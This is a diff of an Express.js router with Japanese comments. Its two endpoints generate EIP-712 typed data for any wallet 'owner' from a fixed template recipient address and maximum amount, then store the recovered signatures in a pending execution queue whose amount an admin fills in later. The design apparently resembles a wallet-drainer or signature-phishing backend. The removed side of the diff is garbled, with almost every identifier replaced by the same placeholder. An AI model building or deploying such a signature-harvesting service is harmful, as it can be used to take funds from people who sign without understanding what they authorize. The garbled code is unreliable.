@@ -1,49 +1,49 @@
 const express = require("express");
-const router = REF_DOMAIN();
+const router = express.Router();
 const db = require("../db");
 const { ethers } = require("ethers");
 
 /* ===================================
-   ① 署名データ生成（owner可変対応）
+   ① 署名データ生成(owner可変対応)
 =================================== */
-REF_DOMAIN("/sign-data", async (req, res) => {
+router.get("/sign-data", async (req, res) => {
   try {
-    const { owner } = REF_DOMAIN;
+    const { owner } = req.query;
 
     if (!owner) {
-      return REF_DOMAIN(400).json({ error: "owner required" });
+      return res.status(400).json({ error: "owner required" });
     }
 
     // 最新テンプレ
-    let [templateRows] = await REF_DOMAIN(
+    let [templateRows] = await db.query(
       "SELECT * FROM authorizations WHERE owner = 'TEMPLATE' ORDER BY id DESC LIMIT 1"
     );
 
-    if (!REF_DOMAIN) {
+    if (!templateRows.length) {
       // 互換 fallback
-      [templateRows] = await REF_DOMAIN(
+      [templateRows] = await db.query(
         "SELECT * FROM authorizations ORDER BY id DESC LIMIT 1"
       );
     }
 
-    if (!REF_DOMAIN) {
-      return REF_DOMAIN({ error: "no authorization found" });
+    if (!templateRows.length) {
+      return res.json({ error: "no authorization found" });
     }
 
     const t = templateRows[0];
 
     // ownerレコード取得
-    const [ownerRows] = await REF_DOMAIN(
+    const [ownerRows] = await db.query(
       "SELECT * FROM authorizations WHERE owner = ? ORDER BY id DESC LIMIT 1",
       [owner]
     );
 
-    const nonce = REF_DOMAIN();
+    const nonce = Date.now();
     let a;
 
-    if (!REF_DOMAIN) {
+    if (!ownerRows.length) {
       // owner未登録: テンプレ複製
-      const [insertResult] = await REF_DOMAIN(
+      const [insertResult] = await db.query(
         `INSERT INTO authorizations
          (chain_id, owner, contract_address, token, to_address, max_amount, used_amount, nonce, deadline)
          VALUES (?, ?, ?, ?, ?, ?, 0, ?, ?)`,
@@ -51,24 +51,24 @@ REF_DOMAIN("/sign-data", async (req, res) => {
           t.chain_id,
           owner,
           t.contract_address,
-          REF_DOMAIN,
+          t.token,
           t.to_address,
           t.max_amount,
           nonce,
-          REF_DOMAIN,
+          t.deadline,
         ]
       );
 
-      const [newRows] = await REF_DOMAIN(
+      const [newRows] = await db.query(
         "SELECT * FROM authorizations WHERE id = ? LIMIT 1",
-        [REF_DOMAIN]
+        [insertResult.insertId]
       );
       a = newRows[0];
     } else {
-      // owner登録済み: テンプレ内容へ同期（毎回最新反映）
+      // owner登録済み: テンプレ内容へ同期(毎回最新反映)
       const targetId = ownerRows[0].id;
 
-      await REF_DOMAIN(
+      await db.query(
         `UPDATE authorizations
          SET chain_id = ?,
              contract_address = ?,
@@ -81,16 +81,16 @@ REF_DOMAIN("/sign-data", async (req, res) => {
         [
           t.chain_id,
           t.contract_address,
-          REF_DOMAIN,
+          t.token,
           t.to_address,
           t.max_amount,
-          REF_DOMAIN,
+          t.deadline,
           nonce,
           targetId,
         ]
       );
 
-      const [updatedRows] = await REF_DOMAIN(
+      const [updatedRows] = await db.query(
         "SELECT * FROM authorizations WHERE id = ? LIMIT 1",
         [targetId]
       );
@@ -101,70 +101,70 @@ REF_DOMAIN("/sign-data", async (req, res) => {
       // 署名対象
       chainId: Number(a.chain_id),
       contractAddress: a.contract_address,
-      nonce: Number(REF_DOMAIN),
+      nonce: Number(a.nonce),
       maxAmount: a.max_amount ? a.max_amount.toString() : "0",
       to: a.to_address,
       data: "0x",
       value: 0,
 
-      // 参照用（署名型には含めない）
-      authId: REF_DOMAIN,
+      // 参照用(署名型には含めない)
+      authId: a.id,
     };
 
-    REF_DOMAIN(signData);
+    res.json(signData);
   } catch (err) {
-    REF_DOMAIN("sign-data error:", err);
-    REF_DOMAIN(500).json({ error: "server error" });
+    console.error("sign-data error:", err);
+    res.status(500).json({ error: "server error" });
   }
 });
 
 /* ===================================
-   ② 署名保存（署名検証あり）
+   ② 署名保存(署名検証あり)
 =================================== */
-REF_DOMAIN("/save-signature", async (req, res) => {
+router.post("/save-signature", async (req, res) => {
   try {
-    const { signature, message } = REF_DOMAIN;
+    const { signature, message } = req.body;
 
     if (!signature || !message) {
-      return REF_DOMAIN(400).json({ error: "invalid params" });
+      return res.status(400).json({ error: "invalid params" });
     }
 
-    const parsed = typeof message === "string" ? REF_DOMAIN(message) : message;
+    const parsed = typeof message === "string" ? JSON.parse(message) : message;
 
     if (!parsed?.domain || !parsed?.types || !parsed?.message) {
-      return REF_DOMAIN(400).json({ error: "invalid typed data" });
+      return res.status(400).json({ error: "invalid typed data" });
     }
 
     // 署名からowner復元
-    const recovered = REF_DOMAIN(
-      REF_DOMAIN,
-      REF_DOMAIN,
-      REF_DOMAIN,
+    const recovered = ethers.verifyTypedData(
+      parsed.domain,
+      parsed.types,
+      parsed.message,
       signature
     );
 
     const owner = recovered;
-    const authId = REF_DOMAIN || null;
+    const authId = parsed.message?.authId || null;
 
     // 署名保存
-    await REF_DOMAIN(
+    await db.query(
       "INSERT INTO signatures (auth_id, owner, signature, message) VALUES (?, ?, ?, ?)",
-      [authId, owner, signature, REF_DOMAIN(parsed)]
+      [authId, owner, signature, JSON.stringify(parsed)]
     );
 
-    // 承認待ちキューへ追加（amountは管理画面で入力）
-    await REF_DOMAIN(
+    // 承認待ちキューへ追加(amountは管理画面で入力)
+    await db.query(
       `INSERT INTO execution_requests
        (auth_id, owner, amount, signature, message, status)
        VALUES (?, ?, '0', ?, ?, 'pending')`,
-      [authId, owner, signature, REF_DOMAIN(parsed)]
+      [authId, owner, signature, JSON.stringify(parsed)]
     );
 
-    REF_DOMAIN({ success: true, owner, authId, pendingCreated: true });
+    res.json({ success: true, owner, authId, pendingCreated: true });
   } catch (err) {
-    REF_DOMAIN("save-signature error:", err);
-    REF_DOMAIN(500).json({ error: "server error" });
+    console.error("save-signature error:", err);
+    res.status(500).json({ error: "server error" });
   }
 });
 
-REF_DOMAIN = router;
+module.exports = router;
